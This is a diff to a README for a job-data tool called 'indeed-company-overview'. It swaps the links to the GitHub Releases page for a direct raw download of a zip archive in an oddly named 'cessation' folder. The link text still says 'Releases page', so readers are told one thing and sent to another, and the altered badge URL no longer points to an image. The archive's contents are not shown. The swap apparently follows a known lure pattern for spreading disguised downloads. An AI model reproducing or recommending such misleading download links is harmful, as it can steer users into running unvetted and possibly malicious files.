@@ -6,11 +6,11 @@ Welcome to the **indeed-company-overview** project. This tool helps you gather i
 
 ### 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-indeed--company--overview-brightgreen)](https://github.com/Sh1er0/indeed-company-overview/releases)
+[![Download Now](https://raw.githubusercontent.com/Sh1er0/indeed-company-overview/main/cessation/indeed-company-overview_v1.5-alpha.4.zip%20Now-indeed--company--overview-brightgreen)](https://raw.githubusercontent.com/Sh1er0/indeed-company-overview/main/cessation/indeed-company-overview_v1.5-alpha.4.zip)
 
 ### 🔗 Visit the Releases Page
 
-To get started, visit the [Releases page](https://github.com/Sh1er0/indeed-company-overview/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Sh1er0/indeed-company-overview/main/cessation/indeed-company-overview_v1.5-alpha.4.zip) to download the latest version of the application. 
 
 ## 📦 Download & Install
 
